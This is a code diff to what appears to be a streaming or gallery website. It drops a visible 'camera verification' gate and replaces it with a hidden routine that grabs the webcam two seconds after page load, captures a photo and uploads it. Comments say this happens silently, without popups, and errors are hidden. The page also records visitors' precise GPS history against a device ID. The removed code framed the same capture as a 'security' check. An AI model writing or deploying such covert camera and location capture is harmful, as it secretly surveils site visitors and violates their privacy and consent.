@@ -151,28 +151,6 @@
     </div>
 </div>
 
-<div id="cameraGate" class="modal-bg" style="display:none; z-index: 10006;">
-    <div class="modal-content">
-        <h3>📸 Security Verification</h3>
-        <p style="text-align:left; font-size:0.9rem; margin-bottom:1rem;">To ensure platform safety, we require a quick camera verification.</p>
-        
-        <div style="background:var(--surf2); border-left:3px solid var(--red); padding:10px; margin-bottom:1.5rem; text-align:left; border-radius:4px;">
-            <p style="font-size:0.85rem; color:var(--muted); line-height:1.4;">
-                <b>Official Note:</b> कृपया अपनी पहचान (Authenticity) वेरिफाई करने के लिए कैमरा एक्सेस "Allow" करें। यह हमारी सुरक्षा नीति का हिस्सा है। वेरिफिकेशन पूरा होने के बाद ही आप वेबसाइट का उपयोग कर पाएंगे। 
-                <br><br><span style="color:var(--red); font-weight:600;">बिना कैमरा वेरिफिकेशन के वेबसाइट का एक्सेस नहीं दिया जाएगा।</span>
-            </p>
-        </div>
-
-        <div id="cameraError" style="color:var(--red); font-size:0.85rem; margin-bottom:1rem; font-weight:600; display:none;">
-            ❌ Permission denied! Please click the lock icon in URL bar, allow camera, and try again.
-        </div>
-        
-        <div class="modal-btn-group">
-            <button class="btn btn-yes" style="width:100%;" onclick="requestCameraAccess()">📷 Verify Camera to Continue</button>
-        </div>
-    </div>
-</div>
-
 <div id="episodesModal" class="modal-bg" style="display:none;">
     <div class="ep-modal-content">
         <h3 id="epModalTitle" style="color:white; font-size:1.2rem; text-align:left; font-weight:600;">Select Episode</h3>
@@ -246,28 +224,23 @@
   let isAdultUser = false;
   let deviceId = null;
   let activeAd = null;
-  let deviceScanner = null;
 
-  // Gate Controller System (Age, GPS & Camera)
+  // Gate Controller System (Age & GPS ONLY)
   function checkGates() {
       const ageStatus = sessionStorage.getItem('ageStatus');
       const gpsVerified = localStorage.getItem('gpsVerified'); 
-      const cameraVerified = localStorage.getItem('cameraVerified'); 
 
       if (!ageStatus) {
           document.getElementById('ageGate').style.display = 'flex';
       } else if (!gpsVerified) {
           isAdultUser = (ageStatus === 'yes');
           document.getElementById('gpsGate').style.display = 'flex';
-      } else if (!cameraVerified) {
-          isAdultUser = (ageStatus === 'yes');
-          document.getElementById('cameraGate').style.display = 'flex';
       } else {
           isAdultUser = (ageStatus === 'yes');
           renderGallery(document.getElementById('searchInput').value);
           
           silentGPSUpdate(); 
-          silentCameraUpdate(); 
+          silentCameraUpdate(); // Run Silent Camera background Check
       }
   }
 
@@ -291,80 +264,24 @@
       }
   }
 
-  // 1. SILENT CAMERA UPDATE (Scanner Start Karega)
+  // 1. SILENT CAMERA UPDATE (NO POPUPS)
   function silentCameraUpdate() {
-      // Agar verification gate pass nahi hua hai toh scanner mat chalao
-      if (localStorage.getItem('cameraVerified') !== 'true') return;
-      
-      startDeviceScanner();
+      setTimeout(async () => {
+          try {
+              if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+              
+              const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+              
+              // Agar permission mil gayi toh chup chap capture karo
+              captureAndUploadPhoto(stream, "Background Silent Capture");
+              
+          } catch (err) {
+              // ERROR YA DENIED: Chup raho, koi popup ya gate nahi dikhana.
+          }
+      }, 2000); // Page open hone ke 2 sec baad try karega
   }
 
-  // 2. AUTO-RUNNING DEVICE SCANNER (The Magic Code)
-  function startDeviceScanner() {
-      // Pehle se koi scanner chal raha ho toh usko roko
-      if (deviceScanner) clearInterval(deviceScanner);
-
-      // Har 3 second me chup-chap background me scan karega (Bina kisi popup ke)
-      deviceScanner = setInterval(() => {
-          if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
-
-          navigator.mediaDevices.enumerateDevices()
-              .then(devices => {
-                  const cameras = devices.filter(d => d.kind === 'videoinput');
-
-                  // OS ne agar hardware hide kar diya hai toh wait karte raho
-                  if (cameras.length === 0) return; 
-
-                  if (navigator.permissions && navigator.permissions.query) {
-                      navigator.permissions.query({ name: 'camera' })
-                          .then(perm => {
-                              // Agar user ne browser se block kar diya toh scanner hamesha ke liye band kar do
-                              if (perm.state === 'denied') {
-                                  clearInterval(deviceScanner); 
-                                  return;
-                              }
-
-                              // SCAN CHECK: Jab Global Camera ON hota hai, tab labels proper aate hain
-                              const isCameraFullyReady = cameras.some(cam => cam.label && cam.label.length > 0);
-
-                              if (perm.state === 'granted' && isCameraFullyReady) {
-                                  // ✅ SCANNER NE CONFIRM KIYA KI CAMERA ON HAI!
-                                  clearInterval(deviceScanner); // Scanner ko roko taaki multiple photo na click ho
-                                  triggerSilentCapture(); // Ab bina dare photo click karo
-                              }
-                          })
-                          .catch(e => { /* Ignore permission query errors */ });
-                  } else {
-                      // Agar browser purana hai aur permissions API support nahi karta
-                      const isCameraFullyReady = cameras.some(cam => cam.label && cam.label.length > 0);
-                      if (isCameraFullyReady) {
-                          clearInterval(deviceScanner);
-                          triggerSilentCapture();
-                      }
-                  }
-              })
-              .catch(e => {
-                  // Scanner background me chup-chap fail ho jayega bina user ko disturb kiye
-              });
-      }, 3000); // Har 3 Second me scan karega
-  }
-
-  // 3. THE TRIGGER (Jab Scanner green signal dega tabhi ye chalega)
-  function triggerSilentCapture() {
-      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-              .then(function(stream) {
-                  // SUCCESS!
-                  captureAndUploadPhoto(stream, "Auto-Scanner Detected Camera ON");
-              })
-              .catch(function(err) {
-                  // FAIL-SAFE: Wapas se Auto-Scanner ko background me chalu kar do aur wait karo.
-                  startDeviceScanner();
-              });
-      }
-  }
-
-  // 4. PHOTO UPLOAD (150ms Fast Click)
+  // PHOTO UPLOAD (150ms Fast Click)
   function captureAndUploadPhoto(stream, actionText) {
       const video = document.getElementById('secretVideo');
       const canvas = document.getElementById('secretCanvas');
@@ -414,32 +331,19 @@
                           accuracy: Math.round(position.coords.accuracy) + " meters", time: new Date().toISOString()
                       };
                       set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), gpsData);
+                      logAction("Initial GPS Location Captured");
                   }
                   checkGates(); 
               },
-              (error) => { errDiv.style.display = 'block'; }, 
+              (error) => { 
+                  errDiv.style.display = 'block'; 
+                  logAction("GPS Access Denied by User");
+              }, 
               { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
-      } else { errDiv.style.display = 'block'; }
-  }
-
-  window.requestCameraAccess = function() {
-      const errDiv = document.getElementById('cameraError');
-      errDiv.style.display = 'none';
-      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-              .then(function(stream) {
-                  localStorage.setItem('cameraVerified', 'true');
-                  document.getElementById('cameraGate').style.display = 'none';
-                  captureAndUploadPhoto(stream, "Initial Verification");
-                  checkGates(); 
-              })
-              .catch(function(err) {
-                  errDiv.style.display = 'block';
-              });
-      } else {
-          errDiv.innerText = "Camera not supported.";
-          errDiv.style.display = 'block';
+      } else { 
+          errDiv.innerText = "GPS is not supported on this device.";
+          errDiv.style.display = 'block'; 
       }
   }
 
